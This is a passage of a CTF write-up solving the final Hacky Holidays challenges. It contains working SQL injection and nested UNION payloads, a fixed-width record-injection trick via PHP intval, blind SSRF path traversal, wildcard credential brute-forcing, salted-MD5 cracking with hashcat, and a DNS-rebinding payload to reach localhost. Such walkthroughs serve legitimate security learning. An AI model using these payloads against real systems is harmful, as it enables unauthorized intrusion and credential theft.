function addUser($username, $password, $age, $firstname, $lastname) {
    $random_hash = md5(print_r($_SERVER, true) . print_r($_POST, true) . date("U") . microtime() . rand());
    $line = "";
    $line .= str_pad($username, 15, "#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad($age, 3, "#");
    $line .= str_pad($firstname, 15, "#");
    $line .= str_pad($lastname, 15, "#");
    $line .= "N";
    $line = substr($line, 0, 113);
    file_put_contents("users.txt", $line . PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers(); // parses users.txt
$page = "signup.php";
// -- snip --
if ($page == "signup.php") {
    $errors = array();
    if (isset($_POST["action"])) {
        // -- snip --
        if ($_POST["action"] == "signup" && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["username"]), 0, 15);
            if (isset($all_users[$username])) {
                $errors[] = "Username already exists";
            }
            $password  = md5($_POST["password"]);
            $firstname = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["firstname"]), 0, 15);
            $lastname = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["lastname"]), 0, 15);
            if (!is_numeric($_POST["age"]) || strlen($_POST["age"]) > 3) {
                $errors[] = "Age entered is invalid";
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie("token", $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once $page;
```

This is the important part of the code.

So, the `addUser` function and how it works makes me think of a Content Injection attack. This kind of vulnerability is really hard to notice, especially without source code review. I have written in the past a writeup for [a similar challenge from Google CTF](https://nytr0gen.github.io/writeups/ctf/2018/07/08/google-ctf-2018-quals.html#bookshelf-writeup), which I believe has an interesting scenario and is worth reading.

My goal is to have a **Y** in the admin column.

Ok, but HOW? Username, First Name, and Last Name are all restricting characters. Password is using MD5 Hashing, which is fixed-length to 32 characters. Age? It's a number.

I've taken it all in, then chased my tail for a few hours until I figured out how this can be attacked.

Well, I finally did a Google search for [`intval`](https://www.php.net/manual/en/function.intval.php) and found out it accepts a bunch of stuff, not only digits. The interesting thing is that it accepts and transforms Scientific E notation. For example: `1e1 == 10`, `1e2 == 100`, `1e3 = 1000`. So, the age is limited to 3 chars, but with this, it can be as long as 10 characters. I didn't want to abuse my newfound powers, so I only used `1e3` to push the line by one character. Anything from `1e3` to `1e9` will work here. I intercepted the request in Burp and manually changed the value of the age.

- Username: nytr0gen
- Password: test
- Age: **1e3**
- First Name: test
- Last Name: **YYYYYYYYYYYYYYY**

Registered with these credentials and got the flag. Also, a link to the next step at [/r3c0n_server_4fdk59](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59)

{F1139772}

# Challenge XI - Recon Server 💉🤯

The Grinch has been tracking Santa Claus for the last few years, trying to locate his secret workshop. I've gained access to the server that hosts the photo albums. Let's take a look [inside](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59)!

{F1139780}

It's strange that the picture link looks like this [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpb...](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9). That's a Base 64. A juicy one.

```js
> echo 'eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9' | base64 -d | jq
{
  "image": "r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg",
  "auth": "94fb398d78b36e7c079e7560ce9df721"
}
```

Trying to view that image directly will result in an error. That means I really need this JSON.

Changing anything in the **auth** parameter resulted in an error. The same for the **image** parameter. That means the **auth** parameter is a verification hash for the image.

I didn't really want to try to bruteforce that hash :)) That's basically the last measure.

I did a directory bruteforce that uncovered some stuff.

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ' -w $COMMONDIR -mc all -fc 404
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
```

I know `picture` and `uploads`. But **api** is new. Note: `/api/experiments` is a false positive because `/api/anythingandeverything` will respond with `401` as well.

{F1139776}

These look interesting, but from my point of view, I keep getting `401` and `404`—possibly randomly :)). I did bruteforce with bigger lists, bruteforcing parameters, looked for hidden comments, searched for GitHub leaks.

I realized I might not have given enough attention to the `/album?hash=jdh34k`. I tried the classic single quote and double quote, hopeful that I can trigger an error. Nothing. What about `jdh34k' and 1='1`. This incredibly worked.

Now I wanted to get this one by hand, just because I spent so much figuring out sqlmap for the other challenge, I was tired of it. I've gone old school. There's this [really nice tutorial](https://medium.com/bugbountywriteup/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5) that might be helpful to follow along.

| Payload | Status Code |
| ------- | :---------: |
| jdh34k' and 1='1 | 200 |
| jdh34k' and 1='0 | 404 |
| jdh34k' and 1='1';-- | 200 |

This one looks like it might be possible to output the results with `UNION`. The first step is to determine the number of columns with `ORDER BY`. The payload is `jdh34k' order by 3;--`. Then use UNION to see the possible outputs. Final payload is `jdh34k' and 1=0 union all select 1,2,3;--`.

{F1139782}

I noticed here that only the **3** is reflected on the page. Maybe the other two parameters are used for some stuff. Also, there are 2 photos on the page. If I change the 1 to a 2 or a 3, the number of photos will change as well. Anything else, and the photos will disappear.

I finally gave in and used sqlmap to have a better understanding of what I'm dealing with. I dumped everything. Using the data I got, I built the following diagram:

{F1139778}

Following the diagram, the vulnerable query should look something like this:

```sql
SELECT id, hash, name
FROM album
WHERE hash = '$input_hash'
```

Something also noteworthy from the diagram is that the `auth` parameter is not in the database. That means it might be generated at runtime? This gives me hope for a [Server Side Request Forgery](https://portswigger.net/web-security/ssrf) attack.

Going forward, I already figured out that the `hash` column might be useless. And in my mind, the `id` was somehow used to get these photos. And maybe that photos query is vulnerable as well. Tried the same payload, `1' and 1='1`, and I got the same number of photos. Tried `1='0`, and I got no photos as a result. LOL! This will be tough!

So basically, my initial payload was `jdh34k' and 1=0 union all select 1,2,3;--`, and the vulnerable parameter is 1. So the new payload is `jdh34k' and 1=0 union all select "1' and 1='1",2,3;--`... That's sick!

For simplicity, the table of payloads from below will include only the vulnerable parameter from inside:

| Payload | Num of Photos |
| ------- | :-----------: |
| 1' and 1='1 | 2 |
| 1' and 1='0 | 0 |
| 1' order by 3;-- | 2 |
| 1' order by 4;-- | 0 |
| 1' and 1=0 union all select 4,5,6;-- | 1 |

The plot thickens. The final payload is [`jdh34k' and 1=0 union all select "1' and 1=0 union all select 4,5,6;--;--",2,3;--`](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+and+1%3d0+union+all+select+"1'+and+1%3d0+union+all+select+4,5,6%3b--%3b--",2,3%3b--). That's a handful!

The photo that appears has the image set to `r3c0n_server_4fdk59/uploads/6` with a valid auth. I got this!

{F1139781}

Just for the fun of it, the query for getting the photos should be something like:

```sql
SELECT id, album_id, photo
FROM photos
WHERE album_id = '$result_album_id'
```

And a Path Traversal should be possible from this point with `../`. I already know I should be targeting `/api`. Only need to write a proper script to make the requests.

And I did. The script can be seen by downloading {F1139742}. I ran it once with the common wordlist, noticed a bunch of `Expected HTTP status 200, Received 404`, filtered these out, ran it again.

```bash
> python brute_dirs.py
/api/ping - Invalid content type detected
/api/user - Invalid content type detected
```

It seems that for status code 200, it will not show the result unless the Content-Type matches the one of an image. This is unfortunate, and my SSRF seems to be a Blind SSRF. But maybe status codes will suffice.

Let's try to find parameters, I guess. For `/api/ping`, I didn't find a thing. But for `/api/user`, the gods favored me. The parameters are taken from `burp-parameter-names.txt` wordlist from SecLists. Oh, and the script is a bit modified {F1139743}.

```bash
> python brute_params.py
/api/user?username=test - Expected HTTP status 200, Received: 204
/api/user?password=test - Expected HTTP status 200, Received: 204
```

I found the parameters to be **username** and **password**. And they do seem to work separately. My intuition tells me that if this endpoint was meant for internal usage, it should be working as a search. The first thing I tried is if the endpoint was accepting wildcards (`%` and `_`). More details about this type of query in [this article about SQL LIKE operator](https://www.w3schools.com/sql/sql_like.asp).

I tried some requests by hand (with the help of my script to sign it). *Note: The percent sign `%` is URL encoded in the table below as `%25`.*

| URL | Response |
| --- | -------- |
| /api/user?username=**test** | Expected HTTP status 200, Received: 204 |
| /api/user?username=**%25** | Invalid content type detected |
| /api/user?username=**a%25** | Expected HTTP status 200, Received: 204 |
| /api/user?username=**g%25** | Invalid content type detected |
| /api/user?username=**gr%25** | Invalid content type detected |

Yes! My theory of the internal user search is valid. I changed the script a little bit and ran it. Final changes can be seen by downloading {F1139741}.

```bash
> python brute_credentials.py username
g
gr
gri
grin
grinc
grinch
grincha
grinchad
grinchadm
grinchadmi
grinchadmin

> python brute_credentials.py password
s
s4
s4n
s4nt
s4nt4
s4nt4s
s4nt4su
s4nt4suc
s4nt4suck
s4nt4sucks
```

The credentials are:

- Username: **grinchadmin**
- Password: **s4nt4sucks**

And the next step seems to be the login page at https://hackyholidays.h1ctf.com/attack-box/login. Using the credentials I found, I got access to the Grinch Network Attack Server. I finally feel like I have a chance to stop the bad guy!

{F1139779}

# Challenge XII - Attack Box 💣

{F1139799}

This is it! The final battle! Will the Grinch succeed in destroying Christmas for everyone? Or will I be able to save Santa's servers? Keep watching!

With the credentials found in the previous challenge, I was able to login to Grinch Network Attack Server. Here I can see 3 IP Addresses and buttons to attack them. These IPs must be Santa's key servers.

{F1139788}

The flow of the application is the following:
1. Fixed IP Addresses are presented with a base64 payload for the attack.
2. Clicking on any of them will load [/launch?payload=eyJ0...](https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==). Each server has a unique IP address and a unique hash inside that Base64 encoded JSON.
3. The launch endpoint will generate an unique hash for the attack. In my preview that is [/launch/cc2f348ccc3d7d77db26a344910f7150](https://hackyholidays.h1ctf.com/attack-box/launch/cc2f348ccc3d7d77db26a344910f7150).
4. This page makes JSON requests to [/launch/cc2f348ccc3d7d77db26a344910f7150.json?id=0](https://hackyholidays.h1ctf.com/attack-box/launch/cc2f348ccc3d7d77db26a344910f7150.json?id=0) to check for new updates, keeping count of the last ID.

And that's about all there is here. I tried directory bruteforcing and everything else I could think of.

There are two inputs I see here that can be abused.

The first potential input is the **id** parameter on the API endpoint. I tried SQL Injection again, but no luck this time. What about [IDOR](https://portswigger.net/web-security/access-control/idor), an access control vulnerability? Nope. I gave up on this one.

The base64 encoding looks juicy. And it proved in the past to bring some results.

```js
> echo 'eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==' | base64 -d | jq
{
  "target": "203.0.113.33",
  "hash": "5f2940d65ca4140cc18d0878bc398955"
}
```

That hash is bound to the target. Similar to the previous challenge. But I don't see a way to generate them this time around.

Maybe the hash is generated after the host is resolved? I'm thinking that if I use an A record on a domain, resolving to `203.0.113.33`, it may check the hash only after resolving the DNS.

There's this interesting service that I use from [alf.nu/DNS](https://alf.nu/DNS). To have an A record for that IP, I must simply use `203-0-113-33.4i.am`. I tried, and the response was `Invalid Protection Hash`.

I tried spaces before and after the IP address, I tried converting the IP to a bunch of weird formats at [vultr.com/resources/ipv4-converter/](https://www.vultr.com/resources/ipv4-converter/?ip_address=203.0.113.33). I was about to give up. I actually went to sleep early that day because I had no more ideas to break this up.

Then the idea came to me. As if I was getting inspiration from a higher power. Woke up with the energy to break this apart!

So the protection hash is using [MD5](https://en.wikipedia.org/wiki/MD5). Easy to spot because it's kind of the only hash with 32 characters hexadecimal. *Side Note: SHA1 has 40 characters hexadecimal. This might come in handy.*

And the hash is possibly salted or transformed in some way. Because `md5("203.0.113.33") != "5f2940d65ca4140cc18d0878bc398955"`. And the tools I used in one of the previous challenges couldn't find a match for any of the three hashes.

My idea was that the hash might be built in one of the following ways:

- `md5("203.0.113.33" + "RANDOM_WORD")`
- `md5("RANDOM_WORD" + "203.0.113.33")`

I read [this nice tutorial](https://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/) about cracking salted MD5 and went to work. Oh, let's not forget the important part, I downloaded the `rockyou.txt` wordlist from [github.com/brannondorsey/naive-hashcat/releases/](https://github.com/brannondorsey/naive-hashcat/releases/).

I created a file with the 3 hashes I found and their corresponding IPs. I added a test hash to be sure that everything worked properly and saved them as `hashes.txt`.

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
05a671c66aefea124cc08b76ea6d30bb:test
```

I ran two hashcat commands, each one for a different hash+salt scheme.

```bash
> hashcat -m 20 -a 0 hashes.txt ./rockyou.txt
hashcat (v6.1.1) starting...

Hashes: 4 digests; 4 unique digests, 4 unique salts

Dictionary cache hit:
* Filename..: ./rockyou.txt
* Passwords.: 14344384

05a671c66aefea124cc08b76ea6d30bb:test:test

Session..........: hashcat
Status...........: Exhausted
Hash.Name........: md5($salt.$pass)
Hash.Target......: hashes.txt
Guess.Base.......: File (./rockyou.txt)

> hashcat -m 10 -a 0 hashes.txt ./rockyou.txt
hashcat (v6.1.1) starting...

Hashes: 4 digests; 4 unique digests, 4 unique salts

Dictionary cache hit:
* Filename..: ./rockyou.txt
* Passwords.: 14344384

5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($pass.$salt)
Hash.Target......: hashes.txt
Guess.Base.......: File (./rockyou.txt)
```

That went smooth. The Protection Hash is MD5 salted with the word `mrgrinch463`.

The complicated part comes with encoding everything. I have to base64 encode a JSON with a variable target and an MD5 based on that target and a salt. Easy peasy, that's like 5 steps :)). I was thinking of using CyberChef, but I also realized I never used [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) before. What's there to lose?

I was really impressed with the diversity of options and how intuitive it is to use. I built an encoding in the extension's interface, tested it to see if the output matches what I need, then used the encoding input into Burp Repeater to test different targets because the extension encodes the stuff automagically while sending the request.

{F1139785}

Believe me, I tried to use IP addresses that I control in there, and I didn't get any ping from the Grinch Network Attack Server. It seems like it is not yet working. Maybe it's in Demo Mode at the moment. I don't know. It doesn't seem to bring down Santa's servers either. It means I still have time.

It does resolve DNS. If I input a domain name, it gets resolved. Using [requestbin.net/dns](http://requestbin.net/dns), I can see a hit from AWS IPs, but nothing interesting there.

{F1139786}

The mission is to "find a way to stop the Grinch from launching the Denial of Service attack". What if I try to DDOS the Grinch's server.

I can do that by launching an attack to `localhost`.

{F1139787}

This was not about to be that easy! One thing I noticed is that in the response, there are two places where the domain name is resolved. If the domain name has two A records, the first resolve will point to one record, and the second resolve will point to the other one! That could be useful because the `localhost` check seems to be made after the first resolve.

This is tricky to get right. Sometimes it works on the first try. Sometimes it needs 10-20 retries. But it eventually works.

I used [alf.nu/DNS](https://alf.nu/DNS) for this one with the following payload `1s.203-0-113-33.but-50-pct.127-0-0-1.4i.am`.

{F1139783}

Luckily, it worked the first time. I've taken down Grinch Networks and saved the holidays!

{F1139784}

# Ending Notes 📜

This CTF has exceeded all my expectations. I expected some chill and easy challenges for the holidays and met hardcore vulnerabilities from very creative organizers. And I finally had the opportunity to understand how to use sqlmap the right way!

It's been a fantastic CTF. I'm grateful for the amazing creators of the challenge. And in this *interesting* year, I'm grateful to have spent time with my family over the holidays!

Oh, one more thing! I thought I was saving Christmas alone this holiday season. I found out, after I finished the challenge, that I am never alone. A lot of people went after the Grinch on the [Hacker101 Discord](https://www.hacker101.com/discord).

In the end, I'd like to thank the Grinch for helping all of us appreciate more this time of the year!

{F1139791}

## References

- https://www.acunetix.com/blog/articles/blind-xss/
- https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html
- https://en.wikipedia.org/wiki/MD5
- https://en.wikipedia.org/wiki/Universally_unique_identifier
- https://alf.nu/DNS
- https://gchq.github.io/CyberChef/
- https://github.com/brannondorsey/naive-hashcat/releases/
- https://github.com/danielmiessler/SecLists
- https://github.com/ffuf/ffuf
- https://github.com/s0md3v/Arjun
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://dbdiagram.io/home
- https://medium.com/bugbountywriteup/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5
- https://nytr0gen.github.io/writeups/ctf/2018/07/08/google-ctf-2018-quals.html#bookshelf-writeup
- https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100
- https://portswigger.net/burp/communitydownload
- https://portswigger.net/support/using-sql-injection-to-bypass-authentication
- https://portswigger.net/web-security/access-control/idor
- https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/ssrf
- http://requestbin.net/dns
- https://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/
- http://sqlmap.org/
- https://www.hacker101.com/discord
- https://www.openwall.com/john/
- https://www.php.net/manual/en/function.intval.php
- https://www.vultr.com/resources/ipv4-converter/
- https://www.w3schools.com/sql/sql_like.asp
- https://xsshunter.com/

## Impact

.

## Attachments
- brute_credentials.py
- brute_dirs.py
- brute_params.py
- chall01_keepout.png
- chall02_flag.png
- chall02_quote.png
- chall02_trap.png
- chall03_grinch_rating.png
- chall03_teaser.png
- chall03_thelist.txt
- chall03_thelist.png
- chall04_app.png
- chall04_grinch_passport.png
- chall04_teaser.png
- chall05_app.png
- chall05_app_logged.png
- chall05_cookie.png
- chall05_invalid_pwd.png
- chall06_app.png
- chall05_teaser.png
- chall06_secretadmin.png
- chall06_teaser.png
- chall07_preview.mp4
- chall07_directory_listing.png
- chall07_secretchall.png
- chall07_preview_request.png
- chall08_preview.mp4
- chall09_flag.png
- chall09_preview.mp4
- chall09_sqli_confirm.png
- chall10_flag.png
- chall09_teaser.png
- chall10_preview.mp4
- chall10_readme.png
- chall11_api.png
- chall10_teaser.png
- chall11_db.png
- chall11_flag.png
- chall11_preview.mp4
- chall11_sqli_photo.png
- chall11_sqli_request.png
- chall12_before_flag.png
- chall12_flag.png
- chall12_hackvertor.png
- chall12_launch_host_resolve.png
- chall12_launch_localhost.png
- chall12_preview.mp4
- cover.png
- grinch_photo.jpg
- end_cover.png
- my_secure_files_not_for_you.zip
- tweet_chall06.png
- tweet_announce.png
- tweet_chall08_forum.png
- tweet_chall12.png
- tweet_chall07.png
- chall07_solution.png
- chall08_phpmyadmin.png
- chall08_dorks.txt
- chall08_db_creds.png
- chall08_flag.png
